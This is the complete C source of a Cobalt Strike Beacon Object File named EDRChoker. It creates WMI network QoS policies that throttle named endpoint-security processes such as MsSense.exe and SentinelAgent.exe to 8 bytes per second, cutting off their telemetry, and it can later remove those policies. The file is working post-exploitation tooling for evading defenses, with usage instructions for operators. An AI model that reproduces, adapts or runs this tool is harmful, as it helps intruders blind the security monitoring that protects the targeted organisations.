/*
 * edrchoker.c — EDRChoker Beacon Object File
 *
 * Throttles EDR/AV process network to 8 bytes/sec via WMI QoS policy
 * (MSFT_NetQosPolicySettingData in ROOT\\StandardCimv2).
 * Faithful port of the original C# tool; same WMI path, same schema fields.
 *
 * Usage (Cobalt Strike):
 *   edrchoker MsSense.exe SentinelAgent.exe   -- create throttle policy per proc
 *   edrchoker                                  -- remove all user QoS policies (Owner=1)
 *
 * Requires: elevation, wbemidl.h (mingw-w64 >= 5.0 ships it)
 */

#define COBJMACROS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <objbase.h>
#include <wbemidl.h>
#include "beacon.h"

/* ── Dynamic imports: OLE32 ───────────────────────────────────────────────── */
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(
    PSECURITY_DESCRIPTOR, LONG, void*, void*, DWORD, DWORD, void*, DWORD, void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(
    REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateGuid(GUID*);
DECLSPEC_IMPORT int     WINAPI OLE32$StringFromGUID2(REFGUID, LPOLESTR, int);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(
    IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, void*, DWORD);

/* ── Dynamic imports: OLEAUT32 ────────────────────────────────────────────── */
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);

/* ── Dynamic imports: KERNEL32 ────────────────────────────────────────────── */
DECLSPEC_IMPORT int    WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT int    WINAPI KERNEL32$lstrlenA(LPCSTR);
DECLSPEC_IMPORT LPWSTR WINAPI KERNEL32$lstrcpyW(LPWSTR, LPCWSTR);
DECLSPEC_IMPORT LPWSTR WINAPI KERNEL32$lstrcatW(LPWSTR, LPCWSTR);

/* ── GUIDs (defined here; wbemuuid.lib is not linked in a BOF) ────────────── */
/* CLSID_WbemLocator  = {DC12A687-737F-11CF-884D-00AA004B2E24} */
static const CLSID _CLSID_WbemLocator =
    {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
/* IID_IWbemLocator   = {DC12A681-737F-11CF-884D-00AA004B2E24} */
static const IID _IID_IWbemLocator =
    {0xdc12a681,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};

/* ── Helpers ──────────────────────────────────────────────────────────────── */

/* Narrow string → BSTR.  Caller must SysFreeString the result. */
static BSTR AnsiToBSTR(const char* ansi) {
    int wlen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    if (!wlen) return NULL;
    wchar_t* wbuf = (wchar_t*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)wlen * sizeof(wchar_t));
    if (!wbuf) return NULL;
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, ansi, -1, wbuf, wlen);
    BSTR result = OLEAUT32$SysAllocString(wbuf);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, wbuf);
    return result;
}

/* Wide string → narrow, written into caller-supplied buf[buflen]. */
static void WToA(const wchar_t* src, char* buf, int buflen) {
    KERNEL32$WideCharToMultiByte(CP_ACP, 0, src, -1, buf, buflen, NULL, NULL);
}

/*
 * Connect to ROOT\\StandardCimv2 and return an IWbemServices*.
 * Caller must Release() when done.
 */
static IWbemServices* WmiConnect(void) {
    IWbemLocator*  pLoc = NULL;
    IWbemServices* pSvc = NULL;
    HRESULT hr;

    hr = OLE32$CoCreateInstance(
        &_CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
        &_IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance(WbemLocator): 0x%08lX\n", hr);
        return NULL;
    }

    BSTR bNS = OLEAUT32$SysAllocString(L"ROOT\\StandardCimv2");
    hr = IWbemLocator_ConnectServer(pLoc, bNS, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    OLEAUT32$SysFreeString(bNS);

    IWbemLocator_Release(pLoc);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConnectServer(ROOT\\StandardCimv2): 0x%08lX\n", hr);
        return NULL;
    }

    /* Set proxy security blanket — mirrors what System.Management does automatically */
    OLE32$CoSetProxyBlanket(
        (IUnknown*)pSvc,
        10,   /* RPC_C_AUTHN_WINNT     */
        0,    /* RPC_C_AUTHZ_NONE      */
        NULL,
        3,    /* RPC_C_AUTHN_LEVEL_CALL */
        3,    /* RPC_C_IMP_LEVEL_IMPERSONATE */
        NULL,
        0     /* EOAC_NONE             */
    );

    return pSvc;
}

/*
 * Generate two random GUIDs:
 *   guidStr[36]    — lowercase, no braces  (used as the first part of InstanceID)
 *   policyName[9]  — first 8 hex chars of a second GUID  (used as Name)
 * Returns FALSE if StringFromGUID2 fails (should never happen in practice).
 */
static BOOL MakeIds(wchar_t guidStr[37], wchar_t policyName[9]) {
    GUID g1, g2;
    wchar_t buf[40] = {0};
    int i;

    OLE32$CoCreateGuid(&g1);
    if (!OLE32$StringFromGUID2(&g1, buf, 40)) return FALSE;
    /* buf = "{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}" — strip braces, lowercase */
    for (i = 0; i < 36; i++) {
        wchar_t c = buf[i + 1];
        if (c >= L'A' && c <= L'Z') c += 32;
        guidStr[i] = c;
    }
    guidStr[36] = L'\0';

    OLE32$CoCreateGuid(&g2);
    if (!OLE32$StringFromGUID2(&g2, buf, 40)) return FALSE;
    /* Take first 8 chars after '{' */
    for (i = 0; i < 8; i++) policyName[i] = buf[i + 1];
    policyName[8] = L'\0';
    return TRUE;
}

/* ── Core operations ──────────────────────────────────────────────────────── */

static void ThrottleProcess(IWbemServices* pSvc, const char* procName) {
    IWbemClassObject* pClass = NULL;
    IWbemClassObject* pInst  = NULL;
    HRESULT hr;
    VARIANT var             = {0};
    wchar_t guidStr[37]    = {0};
    wchar_t policyName[9]  = {0};
    wchar_t instanceId[128] = {0};
    char    policyNameA[9]  = {0};

    /* Get the class definition */
    BSTR bClass = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
    hr = IWbemServices_GetObject(pSvc, bClass, 0, NULL, &pClass, NULL);
    OLEAUT32$SysFreeString(bClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetObject(MSFT_NetQosPolicySettingData): 0x%08lX\n", hr);
        return;
    }

    hr = IWbemClassObject_SpawnInstance(pClass, 0, &pInst);
    IWbemClassObject_Release(pClass);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SpawnInstance: 0x%08lX\n", hr);
        return;
    }

    /* Build InstanceID = "<guid>\\<name>\\ActiveStore" */
    if (!MakeIds(guidStr, policyName)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] MakeIds: StringFromGUID2 failed\n");
        IWbemClassObject_Release(pInst);
        return;
    }
    KERNEL32$lstrcpyW(instanceId, guidStr);
    KERNEL32$lstrcatW(instanceId, L"\\");
    KERNEL32$lstrcatW(instanceId, policyName);
    KERNEL32$lstrcatW(instanceId, L"\\ActiveStore");

    /* Owner = 1 (user-created, lets us find it again on cleanup) */
    var.vt   = VT_I4;
    var.lVal = 1;
    IWbemClassObject_Put(pInst, L"Owner", 0, &var, 0);

    /* Name */
    var.vt      = VT_BSTR;
    var.bstrVal = OLEAUT32$SysAllocString(policyName);
    IWbemClassObject_Put(pInst, L"Name", 0, &var, 0);
    OLEAUT32$SysFreeString(var.bstrVal);
    var.bstrVal = NULL;

    /* InstanceID — forces entry into the active store immediately */
    var.bstrVal = OLEAUT32$SysAllocString(instanceId);
    IWbemClassObject_Put(pInst, L"InstanceID", 0, &var, 0);
    OLEAUT32$SysFreeString(var.bstrVal);
    var.bstrVal = NULL;

    /* AppPathNameMatchCondition — the process to throttle */
    var.bstrVal = AnsiToBSTR(procName);
    if (!var.bstrVal) {
        BeaconPrintf(CALLBACK_ERROR, "[-] AnsiToBSTR(%s): allocation failed\n", procName);
        IWbemClassObject_Release(pInst);
        return;
    }
    IWbemClassObject_Put(pInst, L"AppPathNameMatchCondition", 0, &var, 0);
    OLEAUT32$SysFreeString(var.bstrVal);
    var.bstrVal = NULL;

    /* IPProtocolMatchCondition = 3 (TCP + UDP) */
    var.vt    = VT_UI4;
    var.ulVal = 3;
    IWbemClassObject_Put(pInst, L"IPProtocolMatchCondition", 0, &var, 0);

    /* NetworkProfile = 0 (all profiles) */
    var.ulVal = 0;
    IWbemClassObject_Put(pInst, L"NetworkProfile", 0, &var, 0);

    /* ThrottleRateAction = 8 bytes/sec (~64 bits/sec; effectively zero egress) */
    var.vt      = VT_UI8;
    var.ullVal  = 8ULL;
    IWbemClassObject_Put(pInst, L"ThrottleRateAction", 0, &var, 0);

    hr = IWbemServices_PutInstance(pSvc, pInst, WBEM_FLAG_CREATE_ONLY, NULL, NULL);
    IWbemClassObject_Release(pInst);

    if (SUCCEEDED(hr)) {
        WToA(policyName, policyNameA, sizeof(policyNameA));
        BeaconPrintf(CALLBACK_OUTPUT, "[+] THROTTLED %-32s  policy: %s\n",
                     procName, policyNameA);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] PutInstance(%s): 0x%08lX\n", procName, hr);
    }
}

static void RemoveAllPolicies(IWbemServices* pSvc) {
    IEnumWbemClassObject* pEnum = NULL;
    IWbemClassObject*     pObj  = NULL;
    HRESULT hr;
    ULONG   returned = 0;
    int     count    = 0;

    BSTR bWQL   = OLEAUT32$SysAllocString(L"WQL");
    /* Only remove user-created policies (Owner=1) — leaves system policies untouched */
    BSTR bQuery = OLEAUT32$SysAllocString(
        L"SELECT * FROM MSFT_NetQosPolicySettingData WHERE Owner = 1");

    hr = IWbemServices_ExecQuery(
        pSvc, bWQL, bQuery,
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
        NULL, &pEnum);

    OLEAUT32$SysFreeString(bWQL);
    OLEAUT32$SysFreeString(bQuery);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ExecQuery: 0x%08lX\n", hr);
        return;
    }

    while (IEnumWbemClassObject_Next(pEnum, 5000, 1, &pObj, &returned) == S_OK) {
        VARIANT varPath = {0};
        VARIANT varName = {0};

        IWbemClassObject_Get(pObj, L"__PATH", 0, &varPath, NULL, NULL);
        IWbemClassObject_Get(pObj, L"Name",   0, &varName, NULL, NULL);

        if (varPath.vt == VT_BSTR && varPath.bstrVal) {
            hr = IWbemServices_DeleteInstance(pSvc, varPath.bstrVal, 0, NULL, NULL);
            if (SUCCEEDED(hr)) {
                count++;
                if (varName.vt == VT_BSTR && varName.bstrVal) {
                    char nameBuf[64] = {0};
                    WToA(varName.bstrVal, nameBuf, sizeof(nameBuf));
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] REMOVED policy: %s\n", nameBuf);
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] DeleteInstance: 0x%08lX\n", hr);
            }
        }

        OLEAUT32$VariantClear(&varPath);
        OLEAUT32$VariantClear(&varName);
        IWbemClassObject_Release(pObj);
        pObj     = NULL;
        returned = 0;
    }

    IEnumWbemClassObject_Release(pEnum);
    /* Next() may return WBEM_S_FALSE with a valid last object (returned=1) */
    if (pObj) IWbemClassObject_Release(pObj);

    if (count == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No user QoS policies found.\n");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Removed %d policies.\n", count);
}

/* ── BOF entry point ──────────────────────────────────────────────────────── */

void go(char* args, int len) {
    HRESULT hr;
    BOOL    needUninit;

    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] EDRChoker requires elevated privileges.\n");
        return;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    needUninit = SUCCEEDED(hr); /* balance every successful init, including S_FALSE */
    /*
     * S_FALSE          — COM already init'd in this thread, same model, fine.
     * RPC_E_CHANGED_MODE (0x80010106) — init'd in different model; WMI still works.
     * Any other failure — bail.
     */
    if (FAILED(hr) && hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx: 0x%08lX\n", hr);
        return;
    }

    /*
     * CoInitializeSecurity is called once per process; returns RPC_E_TOO_LATE
     * if Beacon already called it.  That's harmless — continue regardless.
     */
    OLE32$CoInitializeSecurity(
        NULL, -1, NULL, NULL,
        0,   /* RPC_C_AUTHN_LEVEL_DEFAULT    */
        3,   /* RPC_C_IMP_LEVEL_IMPERSONATE  */
        NULL, 0, NULL);

    IWbemServices* pSvc = WmiConnect();
    if (!pSvc) {
        if (needUninit) OLE32$CoUninitialize();
        return;
    }

    if (len == 0) {
        /* No args — clear mode */
        BeaconPrintf(CALLBACK_OUTPUT, "[*] EDRChoker: removing all user QoS policies...\n");
        RemoveAllPolicies(pSvc);
    } else {
        /* Args = semicolon-delimited process names, e.g. "MsSense.exe;SentinelAgent.exe" */
        datap parser;
        BeaconDataParse(&parser, args, len);
        char* procList = BeaconDataExtract(&parser, NULL);

        if (!procList || KERNEL32$lstrlenA(procList) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] No process names in argument.\n");
            IWbemServices_Release(pSvc);
            if (needUninit) OLE32$CoUninitialize();
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] EDRChoker: throttling processes...\n");

        /* Walk semicolon-delimited list without modifying the buffer */
        const char* cur = procList;
        char nameBuf[MAX_PATH] = {0};

        while (*cur) {
            const char* end = cur;
            while (*end && *end != ';') end++;

            int nameLen = (int)(end - cur);
            if (nameLen > 0 && nameLen < MAX_PATH) {
                int i;
                for (i = 0; i < nameLen; i++) nameBuf[i] = cur[i];
                nameBuf[nameLen] = '\0';
                ThrottleProcess(pSvc, nameBuf);
            }

            cur = *end ? end + 1 : end;
        }
    }

    IWbemServices_Release(pSvc);
    if (needUninit) OLE32$CoUninitialize();
}
